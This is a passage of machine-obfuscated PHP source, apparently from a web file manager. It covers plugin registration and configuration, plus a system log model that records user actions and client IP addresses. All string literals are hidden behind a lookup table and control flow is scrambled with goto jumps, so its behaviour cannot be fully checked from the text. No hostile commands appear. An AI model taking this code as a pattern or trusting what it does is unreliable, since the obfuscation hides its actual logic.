$C‹ÁÄ¶¯š£ = $this->loadList($AßŒ ½ğÃ); if ($aŞì…Î•ƒ×) { Hook::apply($AßŒ ½ğÃ . $bá†ºç™¶’[1772]); } $this->update($C‹ÁÄ¶¯š£[$bá†ºç™¶’[388]], array($bá†ºç™¶’[1773] => $aŞì…Î•ƒ×)); } public function appRegist($ešÂª”‚½, $fø”Œ­“Ì­) { $Fœ…ë¨‰á© =& $_SERVER[ç]; $B¥Ÿ÷Ì¨«À = $this->loadList($ešÂª”‚½); if ($B¥Ÿ÷Ì¨«À) { $this->update($B¥Ÿ÷Ì¨«À[$Fœ…ë¨‰á©[388]], array($Fœ…ë¨‰á©[1767] => $fø”Œ­“Ì­)); } else { $b¨‡°õ« = array($Fœ…ë¨‰á©[28] => $ešÂª”‚½, $Fœ…ë¨‰á©[1767] => $fø”Œ­“Ì­, $Fœ…ë¨‰á©[695] => 0, $Fœ…ë¨‰á©[6] => $this->getConfigDefault($ešÂª”‚½)); $this->insert($b¨‡°õ«); } } public function getConfigDefault($bÅ³¾·‡Ù¥) { $Dô¿²öêâÎ =& $_SERVER[ç]; $Føâå†áÊ = array(); $fÊ¡ƒ¶çğÄ = $this->getPackageJson($bÅ³¾·‡Ù¥); if (!$fÊ¡ƒ¶çğÄ && is_array($fÊ¡ƒ¶çğÄ[$Dô¿²öêâÎ[1774]])) { return $Føâå†áÊ; } foreach ($fÊ¡ƒ¶çğÄ[$Dô¿²öêâÎ[1774]] as $a¢î‘ÏŸÛ => $F ËøÏ”›®) { if (!isset($F ËøÏ”›®[$Dô¿²öêâÎ[370]]) || isset($Føâå†áÊ[$a¢î‘ÏŸÛ])) { continue; } $Føâå†áÊ[$a¢î‘ÏŸÛ] = $F ËøÏ”›®[$Dô¿²öêâÎ[370]]; } return $Føâå†áÊ; } public function getPackageJson($bÑÌë‘ª’ª) { return Hook::apply($bÑÌë‘ª’ª . $_SERVER[ç][1775]); } public function getConfig($aÚ¼¸ŸÍßô, $eº«³Ö“ö = false) { $cªğÚÓ·å‚ =& $_SERVER[ç]; $EÈÂÚàƒá = array(); $EóÌîÜÊñ = $this->loadList($aÚ¼¸ŸÍßô); if ($EóÌîÜÊñ && is_array($EóÌîÜÊñ[$cªğÚÓ·å‚[6]])) { $EÈÂÚàƒá = $EóÌîÜÊñ[$cªğÚÓ·å‚[6]]; } if (!$EÈÂÚàƒá || $eº«³Ö“ö) { $EÈÂÚàƒá = $this->getConfigDefault($aÚ¼¸ŸÍßô); } return $EÈÂÚàƒá; } public function setConfig($e‡à°Ì¸Áá, $C¨ÌÌ­ï¶® = false) { goto D¤ïï±¬‚; EÜù¢Š•Õ: $this->update($a‰Î›œ¥ìğ[$Bô¡’õí¶Ò[388]], array($Bô¡’õí¶Ò[6] => $cìÖèÀĞ)); goto D‘¶¯ß×âÀ; dª¤’êà…Ë: $cìÖèÀĞ = $a‰Î›œ¥ìğ[$Bô¡’õí¶Ò[6]]; if ($C¨ÌÌ­ï¶® == !1) { $cìÖèÀĞ = array(); $C¨ÌÌ­ï¶® = $this->getConfigDefault($e‡à°Ì¸Áá); } foreach ($C¨ÌÌ­ï¶® as $BÜç®£†ªá => $cÂŞáïß’Ø) { $cìÖèÀĞ[$BÜç®£†ªá] = is_string($cÂŞáïß’Ø) ? trim($cÂŞáïß’Ø) : $cÂŞáïß’Ø; } goto EÜù¢Š•Õ; D¤ïï±¬‚: $Bô¡’õí¶Ò =& $_SERVER[ç]; $a‰Î›œ¥ìğ = $this->loadList($e‡à°Ì¸Áá); if (!$a‰Î›œ¥ìğ) { return !1; } goto dª¤’êà…Ë; D‘¶¯ß×âÀ: } public function viewList() { goto c“å·‡Ìã; eáÃ˜®¼µ½: $a…„¤—†î = $this->loadPluginList(); $dƒíÄÜß¤¨ = array(); foreach ($a…„¤—†î as $CÚ‚è´íÉ => $dŒòŠ‡ƒ…ƒ) { unset($dŒòŠ‡ƒ…ƒ[$E†ì­æÔ‚Æ[1767]], $dŒòŠ‡ƒ…ƒ[$E†ì­æÔ‚Æ[6]]); $aó½¼Â„¨ = PLUGIN_DIR . $dŒòŠ‡ƒ…ƒ[$E†ì­æÔ‚Æ[28]] . $E†ì­æÔ‚Æ[1769]; if (!is_file($aó½¼Â„¨)) { continue; } $f¤É¢ ò„ = Hook::apply($dŒòŠ‡ƒ…ƒ[$E†ì­æÔ‚Æ[28]] . $E†ì­æÔ‚Æ[1775]); if (is_array($f¤É¢ ò„)) { $dƒíÄÜß¤¨[$CÚ‚è´íÉ] = array_merge($dŒòŠ‡ƒ…ƒ, $f¤É¢ ò„); } } goto Bä ¬ ×Òî; c“å·‡Ìã: $E†ì­æÔ‚Æ =& $_SERVER[ç]; $a…„¤—†î = $this->loadList(); $this->pluginScan($a…„¤—†î); goto eáÃ˜®¼µ½; Bä ¬ ×Òî: return $dƒíÄÜß¤¨; goto Bâ½òØÁ¥ß; Bâ½òØÁ¥ß: } private function loadPluginList() { $BÑ¥ˆÕÁ¥ =& $_SERVER[ç]; $f„‘ôÑ¢ = $this->loadList(); if (strtolower(MOD) == $BÑ¥ˆÕÁ¥[1776]) { return $f„‘ôÑ¢; } $FŞ±ô°ºÑ = Hook::trigger($BÑ¥ˆÕÁ¥[1777], $f„‘ôÑ¢); if ($f„‘ôÑ¢ && !$FŞ±ô°ºÑ) { die; } return $FŞ±ô°ºÑ ? $FŞ±ô°ºÑ : $f„‘ôÑ¢; } private function pluginScan($Dï‡äØ‚) { $AÌöâ ¤í =& $_SERVER[ç]; recursion_dir(PLUGIN_DIR, $a‹Æ‰¾Éè, $eÜäÏÁà, 0); foreach ($a‹Æ‰¾Éè as $F–©­äÅ¥¡) { $a‘ ¿ ›Ã = get_path_this($F–©­äÅ¥¡); if (isset($Dï‡äØ‚[$a‘ ¿ ›Ã]) || !file_exists($F–©­äÅ¥¡ . $AÌöâ ¤í[1778]) || !file_exists($F–©­äÅ¥¡ . $AÌöâ ¤í[1769])) { continue; } Hook::apply($a‘ ¿ ›Ã . $AÌöâ ¤í[1772]); } } } goto BÙÏ²ÕÀù; a”ËÛùŠ†: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\114\x69\147\x68\164\101\x70\x70"; public $modelType = "\x53\x79\163\164\x65\155\x4f\x70\x74\x69\157\x6e"; public $field = array("\x6e\141\x6d\x65", "\147\x72\x6f\x75\160", "\144\145\163\143", "\143\x6f\x6e\164\145\156\164"); public function listData($d¢ß¹¦¹¢Ë = false, $e™š‹‹ªÑƒ = "\x6d\x6f\x64\151\x66\x79\124\x69\x6d\145", $cÙ‹ÀŒöö£ = true) { return parent::listData($d¢ß¹¦¹¢Ë, $e™š‹‹ªÑƒ, $cÙ‹ÀŒöö£); } public function remove($Eğ„¹ÁÛˆ) { $BÂÔÔ‰ö¢ = $this->findByName($Eğ„¹ÁÛˆ); if (!$BÂÔÔ‰ö¢) { return !1; } return parent::remove($BÂÔÔ‰ö¢[$_SERVER[ç][388]]); } public function add($bÁŒƒÈƒöš) { if ($this->findByName($bÁŒƒÈƒöš[$_SERVER[ç][28]])) { return !1; } return parent::insert($bÁŒƒÈƒöš); } public function update($D¢ª„ç¯Øª, $B„„‡Ä³Ì–) { $EŞä— ö =& $_SERVER[ç]; $f§ Ÿõ„“å = $this->findByName($D¢ª„ç¯Øª); $DêÁ©²°ª® = $this->findByName($B„„‡Ä³Ì–[$EŞä— ö[28]]); if (!$f§ Ÿõ„“å || $DêÁ©²°ª® && $DêÁ©²°ª®[$EŞä— ö[388]] != $f§ Ÿõ„“å[$EŞä— ö[388]]) { return !1; } return parent::update($f§ Ÿõ„“å[$EŞä— ö[388]], $B„„‡Ä³Ì–); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\155\x5f\154\x6f\147"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\124\151\155\x65", "\x74\151\155\145", "\x69\x6e\x73\x65\x72\x74", "\146\x75\156\x63\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $e¹®¨¨Ë°ò =& $_SERVER[ç]; return array($e¹®¨¨Ë°ò[1969] => LNG($e¹®¨¨Ë°ò[1970]), $e¹®¨¨Ë°ò[1971] => LNG($e¹®¨¨Ë°ò[1972]), $e¹®¨¨Ë°ò[1594] => LNG($e¹®¨¨Ë°ò[1973]), $e¹®¨¨Ë°ò[1974] => LNG($e¹®¨¨Ë°ò[1975]), $e¹®¨¨Ë°ò[1976] => LNG($e¹®¨¨Ë°ò[1977]), $e¹®¨¨Ë°ò[1978] => LNG($e¹®¨¨Ë°ò[1979]), $e¹®¨¨Ë°ò[1980] => LNG($e¹®¨¨Ë°ò[1981]), $e¹®¨¨Ë°ò[1624] => LNG($e¹®¨¨Ë°ò[1981]), $e¹®¨¨Ë°ò[1625] => LNG($e¹®¨¨Ë°ò[1982]), $e¹®¨¨Ë°ò[1983] => LNG($e¹®¨¨Ë°ò[1984]), $e¹®¨¨Ë°ò[1985] => LNG($e¹®¨¨Ë°ò[1986]), $e¹®¨¨Ë°ò[1987] => LNG($e¹®¨¨Ë°ò[1988]), $e¹®¨¨Ë°ò[1989] => LNG($e¹®¨¨Ë°ò[1990]), $e¹®¨¨Ë°ò[1622] => LNG($e¹®¨¨Ë°ò[1991]), $e¹®¨¨Ë°ò[1629] => LNG($e¹®¨¨Ë°ò[1992]), $e¹®¨¨Ë°ò[1993] => LNG($e¹®¨¨Ë°ò[1994]), $e¹®¨¨Ë°ò[1995] => LNG($e¹®¨¨Ë°ò[1996]), $e¹®¨¨Ë°ò[1997] => LNG($e¹®¨¨Ë°ò[1998]), $e¹®¨¨Ë°ò[1999] => LNG($e¹®¨¨Ë°ò[2000]), $e¹®¨¨Ë°ò[1632] => LNG($e¹®¨¨Ë°ò[2001]), $e¹®¨¨Ë°ò[1633] => LNG($e¹®¨¨Ë°ò[2002]), $e¹®¨¨Ë°ò[2003] => LNG($e¹®¨¨Ë°ò[2004]), $e¹®¨¨Ë°ò[2005] => LNG($e¹®¨¨Ë°ò[2006]), $e¹®¨¨Ë°ò[2007] => LNG($e¹®¨¨Ë°ò[2008]), $e¹®¨¨Ë°ò[1627] => LNG($e¹®¨¨Ë°ò[2009]), $e¹®¨¨Ë°ò[2010] => LNG($e¹®¨¨Ë°ò[2011]), $e¹®¨¨Ë°ò[1626] => LNG($e¹®¨¨Ë°ò[2012]), $e¹®¨¨Ë°ò[2013] => LNG($e¹®¨¨Ë°ò[2014]), $e¹®¨¨Ë°ò[2015] => LNG($e¹®¨¨Ë°ò[2016]), $e¹®¨¨Ë°ò[2017] => LNG($e¹®¨¨Ë°ò[2017]), $e¹®¨¨Ë°ò[2018] => LNG($e¹®¨¨Ë°ò[2018]), $e¹®¨¨Ë°ò[2019] => LNG($e¹®¨¨Ë°ò[1598]), $e¹®¨¨Ë°ò[2020] => LNG($e¹®¨¨Ë°ò[2021]), $e¹®¨¨Ë°ò[2022] => LNG($e¹®¨¨Ë°ò[2023]), $e¹®¨¨Ë°ò[2024] => LNG($e¹®¨¨Ë°ò[2025]), $e¹®¨¨Ë°ò[2026] => LNG($e¹®¨¨Ë°ò[2027]), $e¹®¨¨Ë°ò[2028] => LNG($e¹®¨¨Ë°ò[2029]), $e¹®¨¨Ë°ò[2030] => LNG($e¹®¨¨Ë°ò[2030]), $e¹®¨¨Ë°ò[2031] => LNG($e¹®¨¨Ë°ò[2032]), $e¹®¨¨Ë°ò[2033] => LNG($e¹®¨¨Ë°ò[2034]), $e¹®¨¨Ë°ò[2035] => LNG($e¹®¨¨Ë°ò[2036]), $e¹®¨¨Ë°ò[2037] => LNG($e¹®¨¨Ë°ò[2038]), $e¹®¨¨Ë°ò[2039] => LNG($e¹®¨¨Ë°ò[2040]), $e¹®¨¨Ë°ò[2041] => LNG($e¹®¨¨Ë°ò[2042])); } private function typeFile() { $e‘Èóšİ£ =& $_SERVER[ç]; $eÂ½œÉ§¢Â = array($e‘Èóšİ£[1629] => array($e‘Èóšİ£[1630]), $e‘Èóšİ£[1987] => array($e‘Èóšİ£[2043]), $e‘Èóšİ£[1989] => array($e‘Èóšİ£[2044]), $e‘Èóšİ£[1622] => array($e‘Èóšİ£[1623]), $e‘Èóšİ£[1995] => array(), $e‘Èóšİ£[1997] => array(), $e‘Èóšİ£[1999] => array(), $e‘Èóšİ£[1632] => array($e‘Èóšİ£[1634]), $e‘Èóšİ£[1633] => array($e‘Èóšİ£[1634]), $e‘Èóšİ£[2003] => array($e‘Èóšİ£[2045]), $e‘Èóšİ£[2005] => array($e‘Èóšİ£[2045]), $e‘Èóšİ£[2007] => array($e‘Èóšİ£[2046]), $e‘Èóšİ£[1993] => array($e‘Èóšİ£[2047]), $e‘Èóšİ£[1627] => array($e‘Èóšİ£[2048]), $e‘Èóšİ£[2010] => array($e‘Èóšİ£[2049]), $e‘Èóšİ£[1626] => array($e‘Èóšİ£[1628])); return $eÂ½œÉ§¢Â; } private function typeAll() { goto AÂ®ÌÕÌŸ; AÚ£İ‚ç‡: foreach ($eåÈğ®Š  as $Aİ”Œ¼ˆŞÛ => $d®‹—ÒùŒ­) { $bÅÆºßÀß[$d®‹—ÒùŒ­[0]] = $bÅÆºßÀß[$Aİ”Œ¼ˆŞÛ]; } $bÅÆºßÀß[$fõÃÖºÒï”[1634]] = LNG($fõÃÖºÒï”[2050]); $bÅÆºßÀß[$fõÃÖºÒï”[2045]] = LNG($fõÃÖºÒï”[2051]); goto A®Á™È”Ò²; AÂ®ÌÕÌŸ: $fõÃÖºÒï” =& $_SERVER[ç]; $bÅÆºßÀß = $this->typeList; $eåÈğ®Š  = array_filter($this->typeFile()); goto AÚ£İ‚ç‡; A®Á™È”Ò²: return $bÅÆºßÀß; goto bòÂÜôğÖê; bòÂÜôğÖê: } public function addLog($B…–Û³ùŸ, $dÚñÔ£´ù = array()) { goto a©ôÄİ¥„; Fø¼»†Ó…¼: if (!$A¤‘…ƒØª™) { $A¤‘…ƒØª™ = (int) Session::get($dŠ¶•±ŒÓë[1781]); } $fö‚ÁêÌ÷Ç = get_client_ip(); if (!$dÚñÔ£´ù || strlen(json_encode($dÚñÔ£´ù)) >= 1024) { $dÚñÔ£´ù = array($dŠ¶•±ŒÓë[2052] => $fö‚ÁêÌ÷Ç); } else { if (is_array($dÚñÔ£´ù)) { $dÚñÔ£´ù[$dŠ¶•±ŒÓë[2052]] = $fö‚ÁêÌ÷Ç; } else { $dÚñÔ£´ù = array($dŠ¶•±ŒÓë[1055] => $dÚñÔ£´ù, $dŠ¶•±ŒÓë[2052] => $fö‚ÁêÌ÷Ç); } } goto CñÈ¬Ü°‘¶; a©ôÄİ¥„: $dŠ¶•±ŒÓë =& $_SERVER[ç]; if (!isset($this->typeList[$B…–Û³ùŸ])) { return; } $A¤‘…ƒØª™ = defined($dŠ¶•±ŒÓë[448]) && USER_ID ? USER_ID : (isset($dÚñÔ£´ù[$dŠ¶•±ŒÓë[1491]]) ? $dÚñÔ£´ù[$dŠ¶•±ŒÓë[1491]] : 0); goto Fø¼»†Ó…¼; CñÈ¬Ü°‘¶: $dÚñÔ£´ù = array($dŠ¶•±ŒÓë[1482] => Session::sign(), $dŠ¶•±ŒÓë[1483] => $A¤‘…ƒØª™, $dŠ¶•±ŒÓë[29] => $B…–Û³ùŸ, $dŠ¶•±ŒÓë[1485] => json_encode($dÚñÔ£´ù)); parent::add($dÚñÔ£´ù); goto AäæÕ¦…Ô; AäæÕ¦…Ô: } public function remove($eºİ«Á÷½) { $this->where(array($_SERVER[ç][406] => $eºİ«Á÷½))->delete(); } private function _makeOrder($Dƒ¤ÔÏÈ = '') { goto b­œ²ùİ·é; c§“ Ø§¹‰: return $this->order($Dƒ¤ÔÏÈ); goto C¶ßõÁÇĞ¯; f­¼ÌĞŒ·: $e‰ë¬Ïœœ¤ = Input::get($d¾À‹ƒ×°½[430], $d¾À‹ƒ×°½[7], $d¾À‹ƒ×°½[1813], array($d¾À‹ƒ×°½[1737], $d¾À‹ƒ×°½[424])); $e‰ë¬Ïœœ¤ = $BÊÀõáÈÒŸ[$e‰ë¬Ïœœ¤]; $Dƒ¤ÔÏÈ = $Dƒ¤ÔÏÈ . "{$c¹‘¹Ïé‹Ö}\40{$e‰ë¬Ïœœ¤}"; goto c§“ Ø§¹‰; b­œ²ùİ·é: $d¾À‹ƒ×°½ =& $_SERVER[ç]; $c¹‘¹Ïé‹Ö = $d¾À‹ƒ×°½[192]; $BÊÀõáÈÒŸ = array($d¾À‹ƒ×°½[422] => $d¾À‹ƒ×°½[423], $d¾À‹ƒ×°½[424] => $d¾À‹ƒ×°½[425]); goto f­¼ÌĞŒ·; C¶ßõÁÇĞ¯: } public function get($A¾ŠØÍÖ‰¥ = '') { goto c±â¯í—; CøæÒóï„À: if (!empty($A¾ŠØÍÖ‰¥[$CÒÌ‹¾Áİº[2052]])) { $d„šËÄ°[$CÒÌ‹¾Áİº[425]] = array($CÒÌ‹¾Áİº[378], "\x25{$A¾ŠØÍÖ‰¥[$CÒÌ‹¾Áİº[2052]]}\45"); } $dÕß²¯Ù…• = $this->_makeOrder()->where($d„šËÄ°)->selectPage(); if (empty($dÕß²¯Ù…•[$CÒÌ‹¾Áİº[365]])) { show_json(array(), !0, $dÕß²¯Ù…•[$CÒÌ‹¾Áİº[362]]); } goto a„¡ˆî‰×; EÕôçÇĞÄ: if ($A¾ŠØÍÖ‰¥[$CÒÌ‹¾Áİº[1491]]) { $d„šËÄ°[$CÒÌ‹¾Áİº[1491]] = $A¾ŠØÍÖ‰¥[$CÒÌ‹¾Áİº[1491]]; } if (isset($A¾ŠØÍÖ‰¥[$CÒÌ‹¾Áİº[708]])) { $e×®šß²Î = $A¾ŠØÍÖ‰¥[$CÒÌ‹¾Áİº[708]]; $c»ïïÁ®’À = isset($A¾ŠØÍÖ‰¥[$CÒÌ‹¾Áİº[470]]) ? $A¾ŠØÍÖ‰¥[$CÒÌ‹¾Áİº[470]] : time(); $d„šËÄ°[$CÒÌ‹¾Áİº[192]] = array($CÒÌ‹¾Áİº[329], array($e×®šß²Î, $c»ïïÁ®’À)); } if ($A¾ŠØÍÖ‰¥[$CÒÌ‹¾Áİº[29]]) { $DÛ±ÀÉÊè¡ = explode($CÒÌ‹¾Áİº[47], $A¾ŠØÍÖ‰¥[$CÒÌ‹¾Áİº[29]]); $cÂêˆÈÇ¿Ç = $this->typeFile(); $e°²¾ÂÈø” = array(); foreach ($DÛ±ÀÉÊè¡ as $FÏÚÉô¦‰) { $e°²¾ÂÈø”[] = $FÏÚÉô¦‰; if (isset($cÂêˆÈÇ¿Ç[$FÏÚÉô¦‰])) { $e°²¾ÂÈø” = array_merge($e°²¾ÂÈø”, $cÂêˆÈÇ¿Ç[$FÏÚÉô¦‰]); } } $e°²¾ÂÈø” = array_unique($e°²¾ÂÈø”); if ($e°²¾ÂÈø”) { $d„šËÄ°[$CÒÌ‹¾Áİº[29]] = array($CÒÌ‹¾Áİº[7], $e°²¾ÂÈø”); } } goto CøæÒóï„À; a„¡ˆî‰×: $dÕß²¯Ù…•[$CÒÌ‹¾Áİº[365]] = $this->logList($dÕß²¯Ù…•[$CÒÌ‹¾Áİº[365]]); return $dÕß²¯Ù…•; goto Bò®¥°æ‹; c±â¯í—: $CÒÌ‹¾Áİº =& $_SERVER[ç]; if (!$A¾ŠØÍÖ‰¥) { show_json(array()); } $d„šËÄ° = array(); goto EÕôçÇĞÄ; Bò®¥°æ‹: } private function ipAddress(&$C‹Å°ïŠ½Ç) { $F…â…ñ¯´ğ =& $_SERVER[ç]; if (!empty($C‹Å°ïŠ½Ç[$F…â…ñ¯´ğ[2052]])) { $CŞÇìê‰˜ = IpLocation::get($C‹Å°ïŠ½Ç[$F…â…ñ¯´ğ[2052]]); } else { $CŞÇìê‰˜ = LNG($F…â…ñ¯´ğ[2053]); } $C‹Å°ïŠ½Ç[$F…â…ñ¯´ğ[2054]] = $CŞÇìê‰˜; } private function descZipDownload($d¾ã‡ô¬Èê, &$f„«îµÌ‘‚) { $f–°§ÔÏí» =& $_SERVER[ç]; if (!isset($d¾ã‡ô¬Èê[$f–°§ÔÏí»[2055]])) { return; } $DìŸëÏ‘‡ = json_decode($d¾ã‡ô¬Èê[$f–°§ÔÏí»[2055]], !0); foreach ($DìŸëÏ‘‡ as $dé»ô÷âù) { try { $eÓïØ¡æ®Š = IO::infoFull($dé»ô÷âù[$f–°§ÔÏí»[75]]); } catch (Exception $f’å°ÂÃ¨Ç) { continue; } $d¾ã‡ô¬Èê[$f–°§ÔÏí»[75]] = $dé»ô÷âù[$f–°§ÔÏí»[75]]; $f„«îµÌ‘‚[] = $d¾ã‡ô¬Èê[$f–°§ÔÏí»[390]] = $eÓïØ¡æ®Š[$f–°§ÔÏí»[390]]; $f„«îµÌ‘‚[] = $d¾ã‡ô¬Èê[$f–°§ÔÏí»[1869]] = $eÓïØ¡æ®Š[$f–°§ÔÏí»[472]]; break; } return $d¾ã‡ô¬Èê; } private function getSourceList(&$B†ÅÎÈšÛ¸) { $bÇëÇéÜö =& $_SERVER[ç]; $dß××Ùá“ = array(); foreach ($B†ÅÎÈšÛ¸ as $eÀæô¥Áä => $CîÃ°—ïâÚ) { goto C…÷ƒ¤’ÒÏ; c©§»èñ³÷: $dß××Ùá“[] = $Dˆâ…–§Š[$bÇëÇéÜö[390]]; $dß××Ùá“[] = $Dˆâ…–§Š[$bÇëÇéÜö[1869]]; if ($Dˆâ…–§Š[$bÇëÇéÜö[29]] == $bÇëÇéÜö[515]) { $dß××Ùá“[] = $Dˆâ…–§Š[$bÇëÇéÜö[425]][$bÇëÇéÜö[1022]]; $dß××Ùá“[] = $Dˆâ…–§Š[$bÇëÇéÜö[425]][$bÇëÇéÜö[1023]]; } goto b‹‰·”‡ä¿; C…÷ƒ¤’ÒÏ: $Dˆâ…–§Š = json_decode($CîÃ°—ïâÚ[$bÇëÇéÜö[425]], !0); if ($CîÃ°—ïâÚ[$bÇëÇéÜö[29]] == $bÇëÇéÜö[1625]) { $Dˆâ…–§Š = $this->descZipDownload($Dˆâ…–§Š, $dß××Ùá“); $B†ÅÎÈšÛ¸[$eÀæô¥Áä][$bÇëÇéÜö[425]] = json_encode($Dˆâ…–§Š); continue; } if (strpos($CîÃ°—ïâÚ[$bÇëÇéÜö[29]], $bÇëÇéÜö[1870]) !== 0) { if (!isset($Dˆâ…–§Š[$bÇëÇéÜö[75]]) || strpos($CîÃ°—ïâÚ[$bÇëÇéÜö[29]], $bÇëÇéÜö[2056]) !== 0) { continue; } try { $d®ã ‡ÛÜ = IO::infoFull($Dˆâ…–§Š[$bÇëÇéÜö[75]]); } catch (Exception $f®ã‚¶Îõñ) { continue; } $dß××Ùá“[] = $Dˆâ…–§Š[$bÇëÇéÜö[390]] = $d®ã ‡ÛÜ[$bÇëÇéÜö[390]]; $dß××Ùá“[] = $Dˆâ…–§Š[$bÇëÇéÜö[1869]] = $d®ã ‡ÛÜ[$bÇëÇéÜö[472]]; $B†ÅÎÈšÛ¸[$eÀæô¥Áä][$bÇëÇéÜö[425]] = json_encode($Dˆâ…–§Š); continue; } goto c©§»èñ³÷; b‹‰·”‡ä¿: if ($Dˆâ…–§Š[$bÇëÇéÜö[29]] == $bÇëÇéÜö[1877]) { $dß××Ùá“[] = $Dˆâ…–§Š[$bÇëÇéÜö[425]][$bÇëÇéÜö[390]]; } goto däø‚‹ÛË±; däø‚‹ÛË±: } if (!$dß××Ùá“) { return array(); } return Model($bÇëÇéÜö[760])->sourceListInfo($dß××Ùá“, !0); } private function logList($cŞ±Ëáğ¬ã) { goto B‚Ã¶ˆ¦Ãã; CæŸ¶„ó: return $BÏÇÓ¾–Æë; goto e²¥ô¯ÖÔ; B‚Ã¶ˆ¦Ãã: $B°Ä©•÷–í =& $_SERVER[ç]; $e……Å‰«» = array_to_keyvalue($cŞ±Ëáğ¬ã, $B°Ä©•÷–í[33], $B°Ä©•÷–í[1491]); $E„©šÑÃ = Model($B°Ä©•÷–í[501])->userListInfo(array_unique($e……Å‰«»)); goto cÜ‘È–Ô”; e×‡œòùÖ‹: $Dˆ©÷÷³ = array(); foreach ($cŞ±Ëáğ¬ã as $eóŞ‚œ£ËÄ => $BÚòåàçŠ†) { goto d¤÷ƒ¦ŒÆ‹; FÙÔçœŒÄË: $BÚòåàçŠ†[$B°Ä©•÷–í[28]] = isset($eÌ×êË–òè[$B°Ä©•÷–í[28]]) ? $eÌ×êË–òè[$B°Ä©•÷–í[28]] : LNG($B°Ä©•÷–í[2053]); $BÚòåàçŠ†[$B°Ä©•÷–í[1918]] = isset($eÌ×êË–òè[$B°Ä©•÷–í[1918]]) ? $eÌ×êË–òè[$B°Ä©•÷–í[1918]] : $B°Ä©•÷–í[33]; $BÚòåàçŠ†[$B°Ä©•÷–í[1396]] = isset($A¡Ô©ÇÅÑÀ[$c‹‘‚å‹ Ã]) ? $A¡Ô©ÇÅÑÀ[$c‹‘‚å‹ Ã] : $d‹âÖ»Â; goto fÔ¦¨’á‚÷; d¤÷ƒ¦ŒÆ‹: $c‹‘‚å‹ Ã = $BÚòåàçŠ†[$B°Ä©•÷–í[29]]; $eÌ×êË–òè = isset($E„©šÑÃ[$BÚòåàçŠ†[$B°Ä©•÷–í[1491]]]) ? $E„©šÑÃ[$BÚòåàçŠ†[$B°Ä©•÷–í[1491]]] : !1; $d‹âÖ»Â = strpos($c‹‘‚å‹ Ã, $B°Ä©•÷–í[2057]) === 0 ? LNG($B°Ä©•÷–í[2058]) : LNG($B°Ä©•÷–í[2053]); goto FÙÔçœŒÄË; fÔ¦¨’á‚÷: $BÚòåàçŠ†[$B°Ä©•÷–í[1812]] = $eÌ×êË–òè; $D³è¾„ß™î = json_decode($BÚòåàçŠ†[$B°Ä©•÷–í[425]], !0); $BÚòåàçŠ†[$B°Ä©•÷–í[2052]] = isset($D³è¾„ß™î[$B°Ä©•÷–í[2052]]) ? $D³è¾„ß™î[$B°Ä©•÷–í[2052]] : $B°Ä©•÷–í[33]; goto Aè¶Ÿİâõ; Aè¶Ÿİâõ: $this->ipAddress($BÚòåàçŠ†); if (strpos($c‹‘‚å‹ Ã, $B°Ä©•÷–í[1870]) === 0 || isset($D³è¾„ß™î[$B°Ä©•÷–í[1869]])) { goto aÙ­øôó¿×; B­†¤È¸©Å: if ($D³è¾„ß™î[$B°Ä©•÷–í[1882]] && $D³è¾„ß™î[$B°Ä©•÷–í[1882]][$B°Ä©•÷–í[398]] == $B°Ä©•÷–í[1136]) { $Dˆ©÷÷³[] = $BÚòåàçŠ†[$B°Ä©•÷–í[388]]; unset($cŞ±Ëáğ¬ã[$eóŞ‚œ£ËÄ]); continue; } goto Fƒš£šÈ; aÙ­øôó¿×: $D³è¾„ß™î[$B°Ä©•÷–í[84]] = $FÌÙÆ¸‡Èâ[$D³è¾„ß™î[$B°Ä©•÷–í[390]]]; $D³è¾„ß™î[$B°Ä©•÷–í[1882]] = $FÌÙÆ¸‡Èâ[$D³è¾„ß™î[$B°Ä©•÷–í[1869]]]; if ($D³è¾„ß™î[$B°Ä©•÷–í[29]] == $B°Ä©•÷–í[515]) { $D³è¾„ß™î[$B°Ä©•÷–í[425]][$B°Ä©•÷–í[1022]] = $FÌÙÆ¸‡Èâ[$D³è¾„ß™î[$B°Ä©•÷–í[425]][$B°Ä©•÷–í[1022]]]; $D³è¾„ß™î[$B°Ä©•÷–í[425]][$B°Ä©•÷–í[1023]] = $FÌÙÆ¸‡Èâ[$D³è¾„ß™î[$B°Ä©•÷–í[425]][$B°Ä©•÷–í[1023]]]; } goto BÀÖÑ‰ßÚÅ; BÀÖÑ‰ßÚÅ: if ($D³è¾„ß™î[$B°Ä©•÷–í[29]] == $B°Ä©•÷–í[1877]) { $D³è¾„ß™î[$B°Ä©•÷–í[425]][$B°Ä©•÷–í[390]] = $FÌÙÆ¸‡Èâ[$D³è¾„ß™î[$B°Ä©•÷–í[425]][$B°Ä©•÷–í[390]]]; } if ($D³è¾„ß™î[$B°Ä©•÷–í[29]] == $B°Ä©•÷–í[1620]) { $D³è¾„ß™î[$B°Ä©•÷–í[1882]] = $D³è¾„ß™î[$B°Ä©•÷–í[84]]; $D³è¾„ß™î[$B°Ä©•÷–í[1869]] = $D³è¾„ß™î[$B°Ä©•÷–í[1882]][$B°Ä©•÷–í[390]]; $D³è¾„ß™î[$B°Ä©•÷–í[84]] = !1; $D³è¾„ß™î[$B°Ä©•÷–í[390]] = $B°Ä©•÷–í[33]; } if ($D³è¾„ß™î[$B°Ä©•÷–í[84]] && $D³è¾„ß™î[$B°Ä©•÷–í[84]][$B°Ä©•÷–í[398]] == $B°Ä©•÷–í[1136]) { $Dˆ©÷÷³[] = $BÚòåàçŠ†[$B°Ä©•÷–í[388]]; unset($cŞ±Ëáğ¬ã[$eóŞ‚œ£ËÄ]); continue; } goto B­†¤È¸©Å; Fƒš£šÈ: } $BÚòåàçŠ†[$B°Ä©•÷–í[425]] = $D³è¾„ß™î; goto EŸà »õó; EŸà »õó: unset($BÚòåàçŠ†[$B°Ä©•÷–í[2059]]); $BÏÇÓ¾–Æë[] = $BÚòåàçŠ†; goto c“ƒ·ŒÚÒ´; c“ƒ·ŒÚÒ´: } $this->clearSystemPathLog($Dˆ©÷÷³); goto CæŸ¶„ó; cÜ‘È–Ô”: $FÌÙÆ¸‡Èâ = $this->getSourceList($cŞ±Ëáğ¬ã); $A¡Ô©ÇÅÑÀ = $this->typeAll(); $BÏÇÓ¾–Æë = array(); goto e×‡œòùÖ‹; e²¥ô¯ÖÔ: } private function clearSystemPathLog($cª”ß±Õ”Ï) { $F—ÁÄ†‚Ã =& $_SERVER[ç]; if (count($cª”ß±Õ”Ï) 